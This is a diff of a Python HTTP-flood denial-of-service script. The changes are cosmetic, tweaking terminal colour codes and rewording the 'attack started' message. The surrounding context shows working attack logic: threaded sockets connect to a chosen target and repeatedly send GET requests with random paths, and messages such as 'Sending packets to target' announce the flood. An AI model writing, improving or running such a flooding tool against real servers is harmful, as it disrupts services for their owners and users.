@@ -14,7 +14,7 @@ def status():
     global thread_num
     thread_num_mutex.acquire(True)
     thread_num += 1
-    print("\33[94;1mSending packets to target [{}]\33[00m".format(thread_num))
+    print("\33[94mSending packets to target [{}]\33[00m".format(thread_num))
     thread_num_mutex.release()
 def urli_path():
     msg = str(string.ascii_letters + string.digits + string.punctuation)
@@ -29,14 +29,14 @@ def attack():
         dos.connect((ip,int( port)))
         dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
     except socket.error:
-        print("\33[91;1mNo connection, server may be down \33[00m")
+        print("\33[91mNo connection, server may be down \33[00m")
     except:
         pass
     finally:
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 def ddos():
-    using = '\33[91;1musing\33[00m(\33[92;1mddos\33[00m) '
+    using = '\33[91musing\33[00m(\33[92;1mddos\33[00m) '
     global host
     global port
     global ip
@@ -50,7 +50,7 @@ def ddos():
     except socket.gaierror:
         print(" ERROR\n Make sure you entered a correct website")
         sys.exit(1)
-    print("[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
+    print("\33[91mPreparing to attack ({}) on port : {}\33[00m".format(ip, port))
     time.sleep(3)
     all_threads = []
     for i in range(num_requests):
